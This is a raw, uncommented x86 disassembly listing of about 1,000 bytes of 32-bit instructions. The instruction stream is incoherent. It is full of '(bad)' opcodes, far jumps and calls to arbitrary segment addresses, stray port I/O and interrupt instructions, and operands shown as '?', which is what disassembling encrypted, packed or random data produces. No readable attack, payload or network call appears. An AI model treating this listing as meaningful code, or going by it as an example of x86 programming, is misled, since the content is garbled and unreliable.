  41fcf1:	xor    ebp,DWORD PTR [ebp+edi*2-0xa85038e]
  41fcf8:	sub    dl,al
  41fcfa:	mov    ds:0xe1fe81a4,eax
  41fcff:	js     0x41fd54
  41fd01:	push   ebp
  41fd02:	cld    
  41fd03:	lea    edi,[eax-0x5546337d]
  41fd09:	mov    bh,BYTE PTR [ebp+0x67]
  41fd0c:	sbb    dl,BYTE PTR [ebx+0x261d780]
  41fd12:	pop    ds
  41fd13:	jge    0x41fcf4
  41fd15:	popf   
  41fd16:	dec    ecx
  41fd17:	jmp    0x6cfc:0x32bf1da5
  41fd1e:	cwde   
  41fd1f:	imul   edx,DWORD PTR [ebp-0x40],0xffffffe8
  41fd23:	(bad)  
  41fd24:	adc    DWORD PTR [ebx-0x48],edi
  41fd27:	or     al,0xf0
  41fd29:	jns    0x41fda4
  41fd2b:	sar    BYTE PTR [eax+0x6ecfc04c],cl
  41fd31:	cld    
  41fd32:	xchg   edx,eax
  41fd33:	mov    WORD PTR [edi],es
  41fd35:	or     DWORD PTR [ebx+0x28],0xffffffbb
  41fd39:	push   ebx
  41fd3a:	add    BYTE PTR [ebx+0xc],cl
  41fd3d:	xlat   BYTE PTR ds:[ebx]
  41fd3e:	pop    esi
  41fd3f:	in     al,dx
  41fd40:	lea    edx,[ecx+0x48]
  41fd43:	xchg   ebx,eax
  41fd44:	dec    BYTE PTR [ebx+0x50]
  41fd47:	jne    0x41fdb1
  41fd49:	cdq    
  41fd4a:	dec    ebx
  41fd4b:	pusha  
  41fd4c:	scas   eax,DWORD PTR es:[edi]
  41fd4d:	add    al,0x84
  41fd4f:	inc    ebp
  41fd50:	out    dx,al
  41fd51:	cmp    DWORD PTR [ebp+eax*2+0x9e70672],ecx
  41fd58:	out    0xfc,al
  41fd5a:	ja     0x41fcf1
  41fd5c:	scas   al,BYTE PTR es:[edi]
  41fd5d:	test   esp,0x2e614644
  41fd63:	inc    esp
  41fd64:	push   0xc49dab4e
  41fd69:	(bad)  
  41fd6b:	inc    eax
  41fd6c:	mov    edi,0x1271fba7
  41fd71:	stos   BYTE PTR es:[edi],al
  41fd72:	mov    esp,DWORD PTR [ebx]
  41fd74:	sbb    edi,esp
  41fd76:	(bad)  
  41fd77:	xchg   esi,eax
  41fd78:	test   al,0xdd
  41fd7a:	shr    BYTE PTR [edi-0x7e],1
  41fd7d:	and    ebp,DWORD PTR [ecx-0x678c485e]
  41fd83:	aaa    
  41fd84:	loope  0x41fd93
  41fd86:	mov    ebx,0x65583322
  41fd8b:	pop    ebx
  41fd8c:	lods   al,BYTE PTR ds:[esi]
  41fd8d:	stos   BYTE PTR es:[edi],al
  41fd8e:	(bad)  
  41fd90:	mov    ebx,0x958f04
  41fd95:	add    eax,0xa6b33829
  41fd9a:	push   0xebfc287e
  41fd9f:	sub    eax,0x94441ae1
  41fda4:	cmp    ebx,esi
  41fda6:	cld    
  41fda7:	mov    ?,edx
  41fda9:	fadd   QWORD PTR [ecx+edx*8-0x19]
  41fdad:	shr    BYTE PTR [edx+0x1f2f3c7d],cl
  41fdb3:	fsubr  DWORD PTR ds:[edi+0x3d8fe47]
  41fdba:	cwde   
  41fdbb:	push   edx
  41fdbc:	out    dx,al
  41fdbd:	call   FWORD PTR ds:0xf3bddbc
  41fdc3:	push   0xc1a5e64f
  41fdc8:	int3   
  41fdc9:	sahf   
  41fdca:	fimul  DWORD PTR [ebx-0x5023cd06]
  41fdd0:	adc    eax,0x5472222
  41fdd5:	and    ah,BYTE PTR [esi+ecx*1]
  41fdd8:	sbb    al,0x84
  41fdda:	nop
  41fddb:	jae    0x41fdff
  41fddd:	dec    ebx
  41fdde:	mov    esi,esp
  41fde0:	jae    0x41fdf8
  41fde2:	call   0x56182846
  41fde7:	paddq  mm3,QWORD PTR [ebp+0x4459e6d1]
  41fdee:	adc    dh,BYTE PTR [eax+edi*1+0x3916952a]
  41fdf5:	scas   eax,DWORD PTR es:[edi]
  41fdf6:	dec    esp
  41fdf7:	sahf   
  41fdf8:	mov    cl,0x75
  41fdfa:	add    eax,0xe041dae2
  41fdff:	sahf   
  41fe00:	add    bl,dh
  41fe02:	js     0x41fe16
  41fe04:	dec    ecx
  41fe05:	std    
  41fe06:	mov    edx,0x10338f0c
  41fe0b:	sbb    BYTE PTR [ebx+0x7aa2cba2],ah
  41fe11:	or     BYTE PTR [ebx-0x6a],ch
  41fe14:	dec    ecx
  41fe15:	cs jl  0x41fe57
  41fe18:	jge    0x41fe39
  41fe1a:	fs xor al,dh
  41fe1d:	pusha  
  41fe1e:	ret    
  41fe1f:	lock pop es
  41fe21:	and    DWORD PTR [edx+esi*4],0x8c5911f5
  41fe28:	aaa    
  41fe29:	dec    ebp
  41fe2a:	jo     0x41fe6f
  41fe2c:	add    ebp,ebp
  41fe2e:	xchg   ecx,eax
  41fe2f:	push   cs
  41fe30:	jecxz  0x41fdf0
  41fe32:	mov    al,ds:0x90177be6
  41fe37:	aaa    
  41fe38:	add    al,0xf7
  41fe3a:	pop    edi
  41fe3b:	push   0x37
  41fe3d:	add    BYTE PTR [edi+esi*1+0x56],ah
  41fe41:	fadd   QWORD PTR [ebx]
  41fe43:	pop    ds
  41fe44:	inc    edx
  41fe45:	int3   
  41fe46:	or     esi,esi
  41fe48:	jmp    0x7e22:0x1752b4ad
  41fe4f:	mov    cl,0x90
  41fe51:	mov    WORD PTR [ecx+0x0],?
  41fe54:	inc    eax
  41fe55:	mov    esp,0x73167568
  41fe5a:	in     al,0xb7
  41fe5c:	or     ah,BYTE PTR [ebx-0x7ec61558]
  41fe62:	clc    
  41fe63:	loope  0x41fe78
  41fe65:	ja     0x41feb7
  41fe67:	jle    0x41fe30
  41fe69:	mov    eax,0xb79f90e6
  41fe6e:	int    0x71
  41fe70:	mov    ebp,0x235de6b5
  41fe75:	push   ebp
  41fe76:	mov    BYTE PTR [edi+0x2ddd99a3],0x1c
  41fe7d:	dec    ecx
  41fe7e:	retf   
  41fe7f:	add    DWORD PTR [ebp-0x47c29e56],0xfffffffa
  41fe86:	mov    BYTE PTR [ecx-0x17],ch
  41fe89:	popf   
  41fe8a:	cmp    bh,BYTE PTR [ecx+ebp*1+0x65]
  41fe8e:	jns    0x41feeb
  41fe90:	bswap  esi
  41fe92:	cmp    DWORD PTR [ebx-0x7b],esp
  41fe95:	or     DWORD PTR [ecx+edx*2-0x1d],esi
  41fe99:	loopne 0x41fea2
  41fe9b:	mov    cl,BYTE PTR [eax]
  41fe9d:	push   esi
  41fe9e:	mov    ah,BYTE PTR ds:0x7752d5e7
  41fea4:	ds pop edi
  41fea6:	jmp    0xa3c9:0x78ee2bac
  41fead:	and    DWORD PTR [esi-0x80],eax
  41feb0:	cs out 0xff,eax
  41feb3:	pop    edx
  41feb4:	icebp  
  41feb5:	jmp    0x41fe97
  41feb7:	enter  0xbc56,0x10
  41febb:	push   ss
  41febc:	push   esp
  41febd:	push   ds
  41febe:	(bad)
  41fec1:	pop    esp
  41fec2:	test   DWORD PTR [esi-0x30],edi
  41fec5:	pop    es
  41fec6:	fcmove st,st(0)
  41fec8:	(bad)  ss:[esp+edi*1]
  41fecc:	(bad)  
  41fece:	mov    bh,0x54
  41fed0:	loopne 0x41fee5
  41fed2:	push   esi
  41fed3:	add    cl,BYTE PTR [esp+ebx*4]
  41fed6:	out    dx,eax
  41fed7:	push   esp
  41fed8:	fcmovnb st,st(4)
  41feda:	or     DWORD PTR [esi+0x429a2121],ebp
  41fee0:	mov    DWORD PTR [edi],ebp
  41fee2:	(bad)
  41fee5:	int3   
  41fee6:	xchg   esi,eax
  41fee7:	jp     0x41ff67
  41fee9:	xor    ebp,DWORD PTR [ebp+ebp*1-0xf]
  41feed:	imul   edx,DWORD PTR [esi+0x1176d732],0xffffffcd
  41fef4:	int3   
  41fef5:	jmp    0x11f74b79
  41fefa:	push   bx
  41fefc:	(bad)  
  41fefd:	fisubr WORD PTR [ebx-0x39ad06c7]
  41ff03:	jb     0x41ff4e
  41ff05:	cwde   
  41ff06:	pop    edx
  41ff07:	push   cs
  41ff08:	sub    DWORD PTR [edx-0x14869c1e],edx
  41ff0e:	mov    ds:0xd598001b,al
  41ff13:	jge    0x41fee8
  41ff15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff16:	xlat   BYTE PTR ds:[ebx]
  41ff17:	call   0x8c74:0x422567ba
  41ff1e:	push   ss
  41ff1f:	je     0x41ff15
  41ff21:	loopne 0x41ff81
  41ff23:	xor    al,0x59
  41ff25:	lahf   
  41ff26:	jle    0x41ff08
  41ff28:	mov    bl,0x2c
  41ff2a:	add    eax,0xc8b354ee
  41ff2f:	or     BYTE PTR [ecx+0x3a],cl
  41ff32:	jne    0x41ff24
  41ff34:	scas   eax,DWORD PTR es:[edi]
  41ff35:	sar    DWORD PTR [edi],1
  41ff37:	int    0x57
  41ff39:	sbb    bl,BYTE PTR [eax]
  41ff3b:	inc    eax
  41ff3c:	cwde   
  41ff3d:	scas   al,BYTE PTR es:[edi]
  41ff3e:	cmp    al,0x91
  41ff40:	les    ecx,FWORD PTR [edi+0x2d]
  41ff43:	daa    
  41ff44:	into   
  41ff45:	cmp    esi,DWORD PTR es:[eax]
  41ff48:	pop    edi
  41ff49:	xchg   ecx,eax
  41ff4a:	(bad)  
  41ff4b:	fs in  al,dx
  41ff4d:	cmc    
  41ff4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff4f:	div    DWORD PTR [esi+ebx*2]
  41ff52:	cmc    
  41ff53:	(bad)  
  41ff54:	test   BYTE PTR ds:0x663097ac,0xd3
  41ff5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff5c:	cwde   
  41ff5d:	test   al,0x9
  41ff5f:	mov    cl,0x18
  41ff61:	mov    dh,0xd1
  41ff63:	nop
  41ff64:	xchg   esp,eax
  41ff65:	inc    esi
  41ff66:	sbb    ch,BYTE PTR [edx+0x7f]
  41ff69:	push   edx
  41ff6a:	pop    eax
  41ff6b:	jo     0x41ffd2
  41ff6d:	retf   
  41ff6e:	and    DWORD PTR [eax],edi
  41ff70:	push   edx
  41ff71:	fstp   DWORD PTR [esi+0x65a7c5ac]
  41ff77:	gs push ebp
  41ff79:	repz add BYTE PTR [ebp+0x4a],0x3c
  41ff7e:	lds    edx,FWORD PTR [ebx-0x422ceb9e]
  41ff84:	cmp    eax,0xbf7aaa85
  41ff89:	nop
  41ff8a:	sbb    ecx,esp
  41ff8c:	imul   ebp,DWORD PTR [edi+0x62],0xffffffdb
  41ff90:	xor    DWORD PTR [esi+0x36],ecx
  41ff93:	or     eax,0x77ec3e4
  41ff98:	push   ss
  41ff99:	pop    ds
  41ff9a:	push   ebp
  41ff9b:	mov    WORD PTR [ecx+0x7206545c],cs
  41ffa1:	fisubr WORD PTR [edx]
  41ffa3:	sbb    eax,0xd5f50718
  41ffa8:	mov    ch,0xce
  41ffaa:	lahf   
  41ffab:	sbb    dh,al
  41ffad:	aad    0x76
  41ffaf:	sbb    eax,0xdf6f1317
  41ffb4:	dec    eax
  41ffb5:	add    BYTE PTR [ebx+0x9a42791],dl
  41ffbb:	mov    ah,0x97
  41ffbd:	aaa    
  41ffbe:	js     0x41ff73
  41ffc0:	fnstcw WORD PTR [esp+edx*4-0x15]
  41ffc4:	nop
  41ffc5:	inc    eax
  41ffc6:	inc    ebp
  41ffc7:	sbb    cl,bl
  41ffc9:	or     esi,DWORD PTR [ebx-0x4e471e09]
  41ffcf:	jne    0x41ffea
  41ffd1:	sbb    ah,BYTE PTR [eax+0x71]
  41ffd4:	mov    dh,0x79
  41ffd6:	mov    ch,0x9a
  41ffd8:	push   ss
  41ffd9:	out    dx,eax
  41ffda:	shl    esp,cl
  41ffdc:	adc    al,0xbd
  41ffde:	fsubr  DWORD PTR [esi+0x92f9dfa]
  41ffe4:	xchg   ecx,eax
  41ffe5:	(bad)  
  41ffe6:	jmp    0x1aa52ecf
  41ffeb:	add    al,0x3e
  41ffed:	pop    ebp
  41ffee:	daa    
  41ffef:	jbe    0x41fff7
  41fff1:	jmp    0xbb77:0xd0dc40a4
  41fff8:	xchg   edi,eax
  41fff9:	sub    dl,BYTE PTR [esi+0x4b]
  41fffc:	push   cs
  41fffd:	dec    eax
  41fffe:	lea    eax,[edi+esi*1+0x654874e5]
  420005:	mov    ds:0x3e60e42a,eax
  42000a:	aas    
  42000b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42000c:	mov    fs,ecx
  42000e:	fcmovne st,st(1)
  420010:	add    eax,0xb548e391
  420015:	cs mov eax,0x6a3c8367
  42001b:	aad    0x4d
  42001d:	adc    cl,0xa
  420020:	aas    
  420021:	mov    cl,0xc0
  420023:	add    BYTE PTR [edx+ecx*1-0x32],bh
  420027:	and    ebp,esp
  420029:	ins    DWORD PTR es:[edi],dx
  42002a:	shr    DWORD PTR [esi],cl
  42002c:	cmp    esp,edx
  42002e:	push   ss
  42002f:	push   ds
  420030:	ins    DWORD PTR es:[edi],dx
  420031:	sbb    al,0x2a
  420033:	add    ah,BYTE PTR [eax]
  420035:	out    dx,eax
  420036:	mov    bl,cl
  420038:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420039:	jae    0x420080
  42003b:	adc    BYTE PTR [esi-0x453893ed],ch
  420041:	jmp    0x41fff7
  420043:	or     esp,DWORD PTR [eax+0x6592efb5]
  420049:	ja     0x420048
  42004b:	sub    dl,0x87
  42004e:	pop    ds
  42004f:	dec    ecx
  420050:	mov    edi,0xa987bac4
  420055:	(bad)  [esi+0x46]
  420058:	loop   0x41fff4
  42005a:	cmp    DWORD PTR ds:0x3e5b2493,0x781d5c30
  420064:	pop    ebx
  420065:	cdq    
  420066:	jno    0x41ffe8
  420068:	mov    cl,0x2a
  42006a:	sub    cl,BYTE PTR [edx]
  42006c:	mov    esi,0x9238aa07
  420071:	xchg   DWORD PTR [ecx-0x6d],esi
  420074:	sub    ebp,DWORD PTR cs:[esi+0x13fe7e6e]
  42007b:	icebp  
  42007c:	in     al,dx
  42007d:	int    0x7d
  42007f:	retf   0x2921
  420082:	ror    BYTE PTR [ebp+0x76d32416],cl
  420088:	push   esp
  420089:	dec    ebx
  42008a:	push   esi
  42008b:	loopne 0x42009b
  42008d:	adc    bh,cl
  42008f:	sub    dl,BYTE PTR [eax-0xb]
  420092:	imul   ebx,DWORD PTR [ecx+edx*8-0x1f6d6178],0x281d5580
  42009d:	or     eax,0x82dd90e7
  4200a2:	outs   dx,BYTE PTR ds:[esi]
  4200a3:	or     bh,BYTE PTR [esi+edx*1-0x4b326887]
  4200aa:	ret    0xed43
  4200ad:	push   esp
  4200ae:	aas    
  4200af:	push   DWORD PTR [ebp+0x44]
  4200b2:	or     ecx,ebp
  4200b4:	scas   al,BYTE PTR es:[edi]
  4200b5:	ret    
  4200b6:	mov    BYTE PTR [edi-0x43],0x7d
  4200ba:	xor    BYTE PTR [edx],ah
  4200bc:	or     ecx,DWORD PTR [eax-0x7c]
  4200bf:	mov    eax,ds:0x3e76676c
  4200c4:	pmulhuw mm5,mm1
  4200c7:	mov    edx,0xbea2dea2
  4200cc:	stos   BYTE PTR es:[edi],al
  4200cd:	and    esp,DWORD PTR [edx]
  4200cf:	xchg   edx,eax
  4200d0:	popa   
  4200d1:	test   BYTE PTR [ecx-0x2e244441],dl
  4200d7:	in     al,0x17
  4200d9:	cdq    
  4200da:	adc    BYTE PTR [edx+0x4e],dl
  4200dd:	mov    ebx,0xfbae7442
  4200e2:	xor    al,0x31
  4200e4:	xchg   DWORD PTR [edi],ecx
  4200e6:	xchg   ebx,eax
  4200e7:	cmc    
  4200e8:	and    ecx,edx
  4200ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200eb:	ins    BYTE PTR es:[edi],dx
  4200ec:	lods   eax,DWORD PTR ds:[esi]
  4200ed:	pop    edi
  4200ee:	and    DWORD PTR [edi],ecx
  4200f0:	adc    DWORD PTR [ebx-0x58c8a4cc],edx
  4200f6:	xchg   ecx,eax
  4200f7:	pop    edx
  4200f8:	or     al,0xa9
  4200fa:	mov    bl,0x3d
  4200fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200fd:	lds    ebx,FWORD PTR [eax+ebx*4+0x1e9e372a]
  420104:	pop    edx
  420105:	(bad)  
  420106:	popf   
  420107:	jl     0x420177
  420109:	or     al,cl
  42010b:	mov    ecx,0xa1c2cf98
  420110:	retf   
  420111:	push   ss
  420112:	out    0x5a,al
  420114:	div    BYTE PTR [ecx+0x7a3d77aa]
  42011a:	fs test al,0x9
  42011d:	sub    esi,DWORD PTR ds:[edx-0xb]
  420121:	repnz les ebx,FWORD PTR [ecx+0x53]
  420125:	inc    eax
  420126:	pop    eax
  420127:	aaa    
  420128:	(bad)  
  420129:	arpl   WORD PTR cs:[ebx-0x71],sp
  42012d:	mov    BYTE PTR [ecx],ah
  42012f:	ins    DWORD PTR es:[edi],dx
  420130:	mov    bl,0xa3
  420132:	pop    eax
  420133:	jle    0x4200e2
  420135:	outs   dx,DWORD PTR ds:[esi]
  420136:	sub    DWORD PTR [edi+0x15562279],ebp
  42013c:	imul   ebp,DWORD PTR [edx-0x58a4d3fa],0x82003385
  420146:	minpd  xmm7,XMMWORD PTR [eax+ebp*4-0x658590b7]
  42014f:	mov    ?,WORD PTR [edx]
  420151:	clc    
  420152:	and    ecx,DWORD PTR [esi]
  420154:	fwait
  420155:	mov    BYTE PTR [edi+esi*8+0x6ab0fbe3],ch
  42015c:	pushf  
  42015d:	push   esp
  42015e:	int3   
  42015f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420160:	ja     0x4201a3
  420162:	dec    eax
  420163:	std    
  420164:	cli    
  420165:	nop
  420166:	shl    ch,1
  420168:	(bad)  [eax]
  42016a:	aad    0xd5
  42016c:	ret    
  42016d:	adc    eax,0xea24c465
  420172:	mov    edi,0x43d3a6bc
  420177:	push   eax
  420178:	xor    al,0x9
  42017a:	shr    DWORD PTR [ebx+0x3c],0x0
  42017e:	sar    BYTE PTR ds:0x9676e277,cl
  420184:	pop    esp
  420185:	jle    0x4201d0
  420187:	shr    ebx,1
  420189:	pusha  
  42018a:	and    DWORD PTR [eax-0x533c5569],ebp
  420190:	add    al,ch
  420192:	test   al,0x2d
  420194:	call   0x6b12bbb0
  420199:	xchg   DWORD PTR ds:0xfc9dc989,ebp
  42019f:	pop    eax
  4201a0:	arpl   WORD PTR [edi+0x7ac6161d],dx
  4201a6:	xchg   dl,al
  4201a8:	jg     0x420207
  4201aa:	sub    eax,0x537bd54b
  4201af:	mov    ch,0xb1
  4201b1:	daa    
  4201b2:	pop    ds
  4201b3:	mov    ah,0x4d
  4201b5:	into   
  4201b6:	pop    es
  4201b7:	xchg   ebp,eax
  4201b8:	idiv   DWORD PTR [edx]
  4201ba:	test   BYTE PTR [edi-0x28],0xc2
  4201be:	div    DWORD PTR [ecx+0x3e]
  4201c1:	popf   
  4201c2:	and    DWORD PTR [eax],ebp
  4201c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201c5:	push   edi
  4201c6:	push   cs
  4201c7:	xor    dh,BYTE PTR [ebx+edi*8]
  4201ca:	ja     0x420227
  4201cc:	ins    BYTE PTR es:[edi],dx
  4201cd:	dec    esi
  4201ce:	dec    ebp
  4201cf:	lock mov edx,0xb7714ca5
  4201d6:	test   DWORD PTR [esi+0xd],eax
  4201d9:	pusha  
  4201da:	push   es
  4201db:	lea    esp,[esp+ecx*2-0x64c69658]
  4201e2:	and    DWORD PTR [ecx+0x6c82225d],ebx
  4201e8:	mov    al,ds:0x3e84fbaa
  4201ed:	lods   eax,DWORD PTR ds:[esi]
  4201ee:	clc    
  4201ef:	jns    0x4201d8
  4201f1:	xchg   esi,eax
  4201f2:	rol    DWORD PTR [edx+0x73bc7e20],1
  4201f8:	and    al,0xc1
  4201fa:	xchg   ebp,eax
  4201fb:	out    dx,al
  4201fc:	or     DWORD PTR [ebp-0x14f0b895],edi
  420202:	inc    edx
  420203:	inc    ebp
  420204:	stos   BYTE PTR es:[edi],al
  420205:	ret    
  420206:	push   ds
  420207:	imul   esp,DWORD PTR [ecx-0x14],0xce5304ad
  42020e:	sub    eax,0x94adb76a
  420213:	cmp    DWORD PTR [ecx],edx
  420215:	push   eax
  420216:	outs   dx,DWORD PTR ds:[esi]
  420217:	push   cs
  420218:	loop   0x420289
  42021a:	dec    edx
  42021b:	xchg   DWORD PTR [esi],ebp
  42021d:	clc    
  42021e:	mov    ds:0xc80d2959,eax
  420223:	jmp    0xc65d:0xbfd9f1bc
  42022a:	xor    eax,0xdff41b1c
  42022f:	cs adc edi,ebx
  420232:	mov    eax,ds:0x12d6b236
  420237:	inc    edi
  420238:	sub    eax,0x11ec42b6
  42023d:	pop    edx
  42023e:	xor    eax,0x7f20eb5e
  420243:	pusha  
  420244:	sbb    ch,dh
  420246:	pop    esi
  420247:	mov    esi,ds
  420249:	call   0x30b5:0x61360f97
  420250:	xor    al,BYTE PTR [eax-0x6fc90b69]
  420256:	dec    ebx
  420257:	outs   dx,DWORD PTR ds:[esi]
  420258:	xchg   esi,eax
  420259:	sahf   
  42025a:	sti    
  42025b:	push   edi
  42025c:	jp     0x42022c
  42025e:	in     al,0xb2
  420260:	sar    BYTE PTR [edx],cl
  420262:	nop
  420263:	jp     0x42028a
  420265:	popf   
  420266:	cmp    eax,0x12c3d129
  42026b:	mov    ebx,0x756ffa96
  420270:	inc    ebx
  420271:	imul   esp,DWORD PTR [esi*4-0x7f61f918],0x1e52662b
  42027c:	and    dl,BYTE PTR [edx]
  42027e:	xlat   BYTE PTR ds:[ebx]
  42027f:	mov    bl,0x12
  420281:	out    0x7a,al
  420283:	cdq    
  420284:	(bad)  
  420285:	xchg   edi,eax
  420286:	dec    ecx
  420287:	xor    edx,DWORD PTR [edx-0x76198e04]
  42028d:	out    dx,eax
  42028e:	sahf   
  42028f:	std    
  420290:	push   esp
  420291:	cmp    eax,0xf0c1b37a
  420296:	xor    ch,BYTE PTR [esi-0x3a]
  420299:	jecxz  0x420231
  42029b:	pop    eax
  42029c:	push   cs
  42029d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42029e:	(bad)  
  4202a0:	fwait
  4202a1:	add    eax,0x92170619
  4202a6:	xor    edx,edx
  4202a8:	xchg   esp,eax
  4202a9:	call   0xd15f:0xa8d46898
  4202b0:	sub    al,0xf7
  4202b2:	sub    al,0xbd
  4202b4:	xchg   edi,eax
  4202b5:	push   cs
  4202b6:	xor    al,0x26
  4202b8:	add    edx,edi
  4202ba:	(bad)  
  4202bb:	jbe    0x4202c6
  4202bd:	arpl   WORD PTR [edi-0x764a7df9],cx
  4202c3:	shl    BYTE PTR [esi-0x7d],1
  4202c6:	jb     0x4202a3
  4202c8:	push   ss
  4202c9:	jmp    0x5a85:0xa7c5153b
  4202d0:	rcr    BYTE PTR [ebp+0x487bab8c],0x64
  4202d7:	push   edx
  4202d8:	les    ebx,FWORD PTR [ecx]
  4202da:	iret   
  4202db:	sbb    BYTE PTR [edx+0x1854a91a],cl
  4202e1:	inc    ebx
  4202e2:	lock dec edx
  4202e4:	mov    eax,ds:0xa79ce12f
  4202e9:	enter  0x310c,0x6a
  4202ed:	sbb    al,0x82
  4202ef:	inc    ebx
  4202f0:	pop    esp
  4202f1:	inc    edi
  4202f2:	pop    edi
  4202f3:	outs   dx,BYTE PTR ds:[esi]
  4202f4:	fs popf 
  4202f6:	je     0x4202ed
  4202f8:	jmp    0x420329
  4202fa:	retf   
  4202fb:	iret   
  4202fc:	sub    ah,BYTE PTR ds:0x982e72b0
  420302:	jmp    0x8b49cc95
  420307:	mov    edi,0xc81fceff
  42030c:	mov    BYTE PTR [edi+0x76],0xe4
  420310:	fcom   QWORD PTR [eax-0x39]
  420313:	sub    dl,al
  420315:	(bad)  
  420316:	mov    eax,ds:0x86d24da5
  42031b:	fisub  DWORD PTR [edi]
  42031d:	cmp    ah,BYTE PTR [edi+edx*2-0x75]
  420321:	pop    ebx
  420322:	mov    DWORD PTR [ecx],esp
  420324:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420325:	mov    ebp,0x5f4cb580
  42032a:	or     eax,0x819f57fd
  42032f:	fnstenv [ebx]
  420331:	(bad)  
  420332:	scas   eax,DWORD PTR es:[edi]
  420333:	sbb    al,0xa0
  420335:	jge    0x42033c
  420337:	(bad)  
  420338:	sub    ebp,DWORD PTR [ebp+ebx*8-0x28d822fa]
  42033f:	inc    ecx
  420340:	jg     0x4202fb
  420342:	repz pushfw 
  420345:	pop    ebx
  420346:	mov    edx,0x402d23d4
  42034b:	mov    ebp,0xd4d53cbc
  420350:	mov    ah,0x7f
  420352:	and    edx,DWORD PTR [ebp-0x54]
  420355:	mov    WORD PTR [ebp+0x4c],?
  420358:	adc    DWORD PTR [edi+ebp*2+0x9],0x8ed29580
  420360:	fmul   st,st(5)
  420362:	outs   dx,BYTE PTR ds:[esi]
  420363:	push   ebp
  420364:	std    
  420365:	aaa    
  420366:	lock xchg ebx,eax
  420368:	retf   
  420369:	jg     0x42037c
  42036b:	mul    DWORD PTR [ecx-0x6c]
  42036e:	push   ds
  42036f:	sti    
  420370:	mov    ebp,0xce44e271
  420375:	stos   DWORD PTR es:[edi],eax
  420376:	jp     0x4203d0
  420378:	hlt    
  420379:	mov    dl,0x38
  42037b:	push   esp
  42037c:	inc    ebx
  42037d:	dec    edx
  42037e:	xor    eax,DWORD PTR [edx-0x70f57ffa]
  420384:	sub    bl,BYTE PTR [ecx-0x470171ac]
  42038a:	fstp   QWORD PTR [edi+ecx*4+0x6e]
  42038e:	cli    
  42038f:	mov    bh,0x48
  420391:	jmp    0x1bec:0x1aa4f203
  420398:	and    eax,0x4bb038ce
  42039d:	add    al,0x25
  42039f:	enter  0x8694,0x78
  4203a3:	sbb    DWORD PTR [ebx+0x58],ecx
  4203a6:	cmp    BYTE PTR [ebx+0x566d906f],0x51
  4203ad:	xlat   BYTE PTR ds:[ebx]
  4203ae:	mov    eax,0xd267153
  4203b3:	sub    al,0xfe
  4203b5:	mov    ecx,edi
  4203b7:	or     al,ch
  4203b9:	cli    
  4203ba:	js     0x4203df
  4203bc:	sar    DWORD PTR [ecx],1
  4203be:	dec    esp
  4203bf:	repz into 
  4203c1:	mov    ds:0x83e10632,eax
  4203c6:	mov    eax,ds:0x3d07f43a
  4203cb:	dec    edx
  4203cc:	retf   
  4203cd:	inc    esp
  4203ce:	pop    esp
  4203cf:	dec    eax
  4203d0:	mov    ecx,0x162190e1
  4203d5:	sbb    al,0xce
  4203d7:	jb     0x4203e3
  4203d9:	push   0xc
  4203db:	call   0xef04:0x98903de7
  4203e2:	xor    DWORD PTR [ebp+0x22b3cd94],edi
  4203e8:	mov    ebx,0x313f413a
  4203ed:	(bad)  
  4203ee:	rcl    BYTE PTR [eax-0x2168b671],1
  4203f4:	and    al,0xd8
  4203f6:	pop    eax
  4203f7:	push   cs
  4203f8:	jmp    0xf64d:0xb41e5e6b
  4203ff:	mov    ds:0xfdad3fd4,al
  420404:	ins    BYTE PTR es:[edi],dx
  420405:	xchg   esp,eax
  420406:	mov    ah,0x80
  420408:	clc    
  420409:	retf   
  42040a:	nop
  42040b:	mov    al,ds:0x74ee6263
  420410:	pop    es
  420411:	leave  
  420412:	cwde   
  420413:	jmp    0x420473
  420415:	in     al,dx
  420416:	adc    esp,ecx
  420418:	cld    
  420419:	mov    ch,BYTE PTR [eax+0x14]
  42041c:	or     al,0x6c
  42041e:	call   0xb6b496fa
  420423:	test   DWORD PTR [ecx+0xe435f12],eax
  420429:	or     eax,0xf3b96e43
  42042e:	std    
  42042f:	or     DWORD PTR [edx-0x2f],ecx
  420432:	cmp    bl,dl
  420434:	lock sub eax,0x32d3716a
  42043a:	dec    edi
  42043b:	jnp    0x4204b2
  42043d:	lds    ebx,FWORD PTR [ebp*1-0x2786eee4]
  420444:	mov    esi,0x7b2caa20
  420449:	mov    dl,0xa7
  42044b:	fbld   TBYTE PTR [ebx+0x268c4ad2]
  420451:	imul   eax,ecx,0x5b835cc2
  420457:	in     al,0x27
  420459:	addr16 xchg ebx,eax
  42045b:	xor    DWORD PTR [eax+0x46],edx
  42045e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42045f:	int    0x78
  420461:	xchg   ebx,eax
  420462:	mov    al,0x3c
  420464:	cmp    eax,0x81c8d039
  420469:	sub    ch,cl
  42046b:	pop    edx
  42046c:	push   edi
  42046d:	and    esp,ebx
  42046f:	and    eax,0x8602f69f
  420474:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420475:	in     eax,dx
  420476:	clc    
  420477:	push   ecx
  420478:	cwde   
  420479:	xchg   esp,eax
  42047a:	aaa    
  42047b:	int3   
  42047c:	xchg   ecx,eax
  42047d:	adc    eax,0xb5686565
  420482:	in     eax,0x61
  420484:	repz and al,0xb5
  420487:	jne    0x4204c2
  420489:	push   edi
  42048a:	nop
  42048b:	out    dx,al
  42048c:	and    edx,ebp
  42048e:	adc    dl,BYTE PTR [ebx-0x75f14b5c]
  420494:	jbe    0x4204ef
  420496:	test   edi,0x8b943b22
  42049c:	mov    WORD PTR [esi],cs
  42049e:	sub    BYTE PTR [ecx-0x64356628],bh
  4204a4:	fucomi st,st(0)
  4204a6:	inc    ebp
  4204a7:	push   ds
  4204a8:	mov    al,0x6c
  4204aa:	sbb    DWORD PTR [edi-0x7d7c56d4],0x9ece4c54
  4204b4:	xor    eax,0x25ab6fc2
  4204b9:	out    dx,al
  4204ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204bb:	jmp    0xebacc9d3
  4204c0:	pop    ds
  4204c1:	xchg   esi,eax
